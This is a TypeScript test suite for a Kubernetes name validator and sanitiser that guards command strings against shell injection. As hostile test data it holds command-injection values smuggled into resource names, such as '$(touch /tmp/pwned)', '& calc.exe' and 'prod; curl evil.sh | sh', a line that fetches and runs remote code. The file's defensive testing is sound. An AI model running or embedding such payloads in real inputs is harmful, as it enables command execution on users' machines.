import * as assert from "assert";
import {
    isValidK8sName,
    toSafeK8sNameFragment,
    validateK8sName,
    validateK8sNames,
} from "../../commands/utils/kubernetesNames";

describe("Kubernetes name validation", () => {
    describe("isValidK8sName", () => {
        it("accepts names a conforming API server can assign", () => {
            assert.ok(isValidK8sName("default", "label"));
            assert.ok(isValidK8sName("kube-system", "label"));
            assert.ok(isValidK8sName("app1", "label"));
            assert.ok(isValidK8sName("aks-nodepool1-12345678-vmss000000", "subdomain"));
            assert.ok(isValidK8sName("node-explorer-abc", "subdomain"));
            assert.ok(isValidK8sName("my.node.example", "subdomain"));
        });

        it("rejects shell metacharacters used to break out of a command", () => {
            const payloads = [
                "aks-np1-vmss000000& node -e \"require('fs').writeFileSync('pwned','1')\" & rem ",
                "aks-np1-vmss000000$(touch /tmp/pwned)",
                "aks-np1-vmss000000`touch /tmp/pwned`",
                "aks-np1-vmss000000; touch /tmp/pwned",
                "aks-np1-vmss000000 | touch /tmp/pwned",
                'node" --node-names "',
                "node%COMSPEC%",
                "node$IFS$9whoami",
            ];

            for (const payload of payloads) {
                assert.strictEqual(isValidK8sName(payload, "subdomain"), false, `should reject: ${payload}`);
                assert.strictEqual(isValidK8sName(payload, "label"), false, `should reject: ${payload}`);
            }
        });

        it("rejects whitespace, which is enough to split an argument", () => {
            assert.strictEqual(isValidK8sName("node name", "subdomain"), false);
            assert.strictEqual(isValidK8sName("node\tname", "subdomain"), false);
            assert.strictEqual(isValidK8sName("node\nname", "subdomain"), false);
        });

        it("rejects empty and over-long names", () => {
            assert.strictEqual(isValidK8sName("", "label"), false);
            assert.strictEqual(isValidK8sName("", "subdomain"), false);
            assert.strictEqual(isValidK8sName("a".repeat(64), "label"), false);
            assert.strictEqual(isValidK8sName("a".repeat(63), "label"), true);
            assert.strictEqual(isValidK8sName("a".repeat(254), "subdomain"), false);
        });

        it("applies DNS-1123 structural rules", () => {
            assert.strictEqual(isValidK8sName("-leading", "label"), false);
            assert.strictEqual(isValidK8sName("trailing-", "label"), false);
            assert.strictEqual(isValidK8sName("UPPER", "label"), false, "DNS-1123 names are lowercase");
            assert.strictEqual(isValidK8sName("under_score", "label"), false);
            assert.strictEqual(isValidK8sName("dotted.name", "label"), false, "a label cannot contain dots");
            assert.strictEqual(isValidK8sName("dotted.name", "subdomain"), true);
            assert.strictEqual(isValidK8sName("double..dot", "subdomain"), false);
            assert.strictEqual(isValidK8sName(".leading", "subdomain"), false);
            assert.strictEqual(isValidK8sName("trailing.", "subdomain"), false);
        });
    });

    describe("validateK8sNames", () => {
        it("passes through valid names and drops the blank line kubectl emits for empty lists", () => {
            const result = validateK8sNames(["node1", "", "  ", "node2"], "subdomain", "node");
            assert.ok(result.succeeded);
            assert.deepStrictEqual(result.result, ["node1", "node2"]);
        });

        it("returns an empty list rather than an error when the cluster has no matching objects", () => {
            const result = validateK8sNames([""], "subdomain", "node");
            assert.ok(result.succeeded);
            assert.deepStrictEqual(result.result, []);
        });

        it("fails the whole list when any name is hostile", () => {
            const result = validateK8sNames(["node1", "node2$(touch /tmp/pwned)"], "subdomain", "node");
            assert.ok(!result.succeeded, "a hostile name must not be silently filtered out");
            assert.ok(result.error.includes("node"), "error should name the resource");
            assert.ok(result.error.includes("touch /tmp/pwned"), "error should show the rejected value");
        });

        it("quotes the rejected value so metacharacters are visible", () => {
            const result = validateK8sNames(["a b"], "subdomain", "node");
            assert.ok(!result.succeeded);
            assert.ok(result.error.includes('"a b"'), `expected a quoted value; got: ${result.error}`);
        });

        it("truncates a long payload instead of flooding the error", () => {
            const result = validateK8sNames([`$(${"a".repeat(500)})`], "subdomain", "node");
            assert.ok(!result.succeeded);
            assert.ok(result.error.includes("..."), "long values should be truncated");
            assert.ok(result.error.length < 400, `error should stay readable; got ${result.error.length} chars`);
        });
    });

    describe("validateK8sName", () => {
        it("returns the name when valid", () => {
            const result = validateK8sName("kube-system", "label", "namespace");
            assert.ok(result.succeeded);
            assert.strictEqual(result.result, "kube-system");
        });

        it("fails on a hostile name", () => {
            const result = validateK8sName("default& calc.exe", "label", "namespace");
            assert.ok(!result.succeeded);
        });

        it("fails on an empty name", () => {
            const result = validateK8sName("   ", "label", "namespace");
            assert.ok(!result.succeeded);
            assert.ok(result.error.includes("empty"));
        });
    });

    describe("toSafeK8sNameFragment", () => {
        it("leaves an ordinary cluster name alone", () => {
            assert.strictEqual(toSafeK8sNameFragment("my-aks-cluster"), "my-aks-cluster");
        });

        it("lowercases, as DNS-1123 names cannot contain uppercase", () => {
            assert.strictEqual(toSafeK8sNameFragment("MyCluster"), "mycluster");
        });

        it("reduces kubeconfig context names that are not valid Kubernetes names", () => {
            // Both of these are ordinary context names that would be rejected by an API server.
            assert.strictEqual(
                toSafeK8sNameFragment("arn:aws:eks:us-east-1:1234:cluster/prod"),
                "arn-aws-eks-us-east-1-1234-cluster-prod",
            );
            assert.strictEqual(toSafeK8sNameFragment("user@example.com"), "user-example-com");
        });

        it("strips shell metacharacters so they cannot reach a command string", () => {
            const payloads = [
                "prod; curl evil.sh | sh",
                "prod& node -e \"require('fs')\" & rem ",
                "prod$(touch /tmp/pwned)",
                "prod`touch /tmp/pwned`",
                'prod" --flag "',
            ];

            for (const payload of payloads) {
                const result = toSafeK8sNameFragment(payload);
                assert.ok(isValidK8sName(result, "label"), `should be a valid label; got "${result}" from ${payload}`);
                assert.ok(result.startsWith("prod"), `should keep the usable prefix; got "${result}"`);
            }
        });

        it("produces a result that is always safe to use as a name", () => {
            const awkward = ["", "---", "///", "$$$", "-leading", "trailing-", "a..b", "  spaced  "];
            for (const value of awkward) {
                const result = toSafeK8sNameFragment(value);
                assert.ok(isValidK8sName(result, "label"), `"${value}" produced an invalid label: "${result}"`);
            }
        });

        it("falls back to a placeholder when nothing usable is left", () => {
            assert.strictEqual(toSafeK8sNameFragment("$$$"), "unknown");
            assert.strictEqual(toSafeK8sNameFragment(""), "unknown");
        });

        it("respects the length budget and does not end on a hyphen", () => {
            const result = toSafeK8sNameFragment("a".repeat(100), 48);
            assert.strictEqual(result.length, 48);

            const truncatedAtHyphen = toSafeK8sNameFragment("abcde-fghij", 6);
            assert.strictEqual(truncatedAtHyphen, "abcde", "a trailing hyphen after truncation is not a valid name");
            assert.ok(isValidK8sName(truncatedAtHyphen, "label"));
        });

        it("keeps the full capture name within a DNS label", () => {
            const contextName = "arn:aws:eks:us-east-1:123456789012:cluster/my-very-long-production-cluster-name";
            const captureName = `retina-capture-${toSafeK8sNameFragment(contextName, 48)}`;
            assert.ok(isValidK8sName(captureName, "label"), `not a valid label: ${captureName}`);
        });
    });
});
